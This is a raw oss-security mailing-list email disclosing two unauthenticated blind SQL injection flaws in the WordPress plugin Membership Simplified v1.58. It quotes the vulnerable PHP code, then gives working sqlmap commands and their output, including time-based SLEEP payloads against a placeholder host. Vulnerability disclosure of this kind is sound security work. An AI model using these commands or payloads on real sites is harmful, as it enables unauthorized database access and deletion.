X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4827" "Wednesday" "22" "March" "2017" "06:59:33" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<BFF5A561-72DD-4395-B558-F4DDBB8AB751@me.com>" "109" "[oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58" nil nil nil "3" "2017032210:59:33" "[oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58" (number mark "U       larry0@me.co Mar 22  109/4827  " thread-indent "\"[oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 27836 invoked by uid 550); 22 Mar 2017 10:59:50 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 27791 invoked from network); 22 Mar 2017 10:59:47 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1490180375; bh=wuxJnqL+3UHUKesmuifuNopAMegiRM1vHDAi96XXXaM=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=EiNIkwQMYZKKrJhNI99GHYkyYEVkicqN+x3wXjiIVXvDoaO6sHBXJ3QOMwdDPaK9g
 W0upyW50NjcwnsdDYV3kJ1Woc3QqhRgf0bgcMNdlHzMitFTmXv8+hjuaY3WK/IAsiG
 30jXQ98FNYyCVxDlWAU+b1IwfTbVQzX5RXfBQaM0fcJJVMXa1GZKPjaTewSPE+rlgK
 U3h5ncSKrDtGOU+VRr2abnGtPOzsbRpP9hHmX6b8zwCaZ879Qr16ORB0HB9WpxS0zQ
 g3tIwh3jKeE5yzS6VyI5FEGRGNv+URQygSIvGAuVmiTIOs2DaQrYjFy2wqPFeXKPkp
 gcNZsPBgW1wvg==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-03-22_09:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1703220095
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <BFF5A561-72DD-4395-B558-F4DDBB8AB751@me.com>
Date: Wed, 22 Mar 2017 06:59:33 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Multiple Unauthenticated blind SQL injections in Wordpress Plugin
 Membership Simplified v1.58

Title: Multiple Unauthenticated blind SQL injections in Wordpress Plugin Me=
mbership Simplified v1.58
Author: Larry W. Cashdollar, @_larry0
Date: 2017-03-17
CVE-ID:[CVE-2017-1002009][CVE-2017-1002010]
Download Site: http://membership.officeautopilot.com/get-it-now/
Vendor: http://membership.officeautopilot.com/
Vendor Notified: 2017-03-17
Vendor Contact: http://membership.officeautopilot.com/1-58-has-been-release=
d-and-works-with-version-4-5-of-wordpress/#comment-484
Advisory: http://www.vapidlabs.com/advisory.php?v=3D188
Description: Membership Simplified allows you to generate membership lesson=
s with templated content to create a unified look and feel throughout your =
courses.
Vulnerability:
The code in membership-simplified-for-oap-members-only/updateDB.php is vuln=
erable to blind SQL injection because it doesn't sanitize user input via an=
y of the POST requests being passed into the SQL query.  Also it doesn't ch=
eck that a user is authorized to make updates to the database.

  2 require_once("../../../wp-config.php");
  3 global $wpdb;
  4 $table_name =3D $wpdb->prefix . "download_listing";
  5 $media_table_name =3D $wpdb->prefix . "media_listing";
  6 $action =3D $_POST['action'];
  7 $updateRecordsArray =3D $_POST['recordsArray'];
  8 $mediaupdateRecordsArray =3D $_POST['mediaRecordsArray'];

CVE-2017-1002009:
I chose to test the SQL injection against the delete action as it was the m=
ost straightforward injection point.

 34 if($action =3D=3D 'delete') {
 35         $upload_base_dir =3D wp_upload_dir();
 36         $upload_dir =3D  $upload_base_dir['basedir'];
 37         $path=3D $upload_dir.'/membership-simplified-for-oap-members-on=
ly/';
 38         $fileName =3D $wpdb->get_row("select fileName from $table_name =
where recordId=3D ".$_POST['recordId']."");
 39         @unlink($path.$fileName->fileName);
 40         $query=3D "delete from $table_name where recordId=3D '".$_POST[=
'recordId']."' ";
 41         $wpdb->query($query) or die('Error, insert query failed');
 42=20
 43 }

CVE-2017-1002010:

 56 if($action =3D=3D 'delete_media') {
 57         $upload_base_dir =3D wp_upload_dir();
 58         $upload_dir =3D $upload_base_dir['basedir'];
 59         $path =3D $upload_dir.'/membership-simplified-for-oap-members-o=
nly/';
 60         $fileName =3D $wpdb->get_row("select fileName from $media_table=
_name where recordId=3D ".$_POST['recordId']."");
 61         //@unlink($path.$fileName->fileName);
 62         $query=3D "delete from $media_table_name where recordId=3D '".$=
_POST['recordID']."' ";
 65         $wpdb->query($query) or die($query);

Exploit Code:
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/mem=
bership-simplified-for-oap-members-only/updateDB.php' --data 'action=3Ddele=
te&recordId=3D*' --dbms mysql  --level 3 --risk 3
	=E2=80=A2=20=20
	=E2=80=A2 (custom) POST parameter '#1*' is vulnerable. Do you want to keep=
 testing the others (if any)? [y/N]=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 1411 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* ((custom) POST)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
e (substraction)
	=E2=80=A2     Payload: action=3Ddelete&recordId=3D(SELECT * FROM (SELECT(S=
LEEP(5)))uxVZ)
	=E2=80=A2 ---
	=E2=80=A2 [02:10:51] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [02:10:51] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 02:10:51
	=E2=80=A2=20=20
	=E2=80=A2=20=20
	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/mem=
bership-simplified-for-oap-members-only/updateDB.php' --data 'action=3Ddele=
te_media&recordId=3D*' --dbms mysql  --level 3 --risk 3
	=E2=80=A2=20=20
	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
of 1411 HTTP(s) requests:
	=E2=80=A2 ---
	=E2=80=A2 Parameter: #1* ((custom) POST)
	=E2=80=A2     Type: AND/OR time-based blind
	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
e (substraction)
	=E2=80=A2     Payload: action=3Ddelete_media&recordId=3D(SELECT * FROM (SE=
LECT(SLEEP(5)))ENgw)
	=E2=80=A2 ---
	=E2=80=A2 [02:34:49] [INFO] the back-end DBMS is MySQL
	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
	=E2=80=A2 web application technology: Apache 2.4.18
	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
	=E2=80=A2 [02:34:49] [INFO] fetched data logged to text files under '/home=
/larry/.sqlmap/output/example.com'
	=E2=80=A2=20=20
	=E2=80=A2 [*] shutting down at 02:34:49=
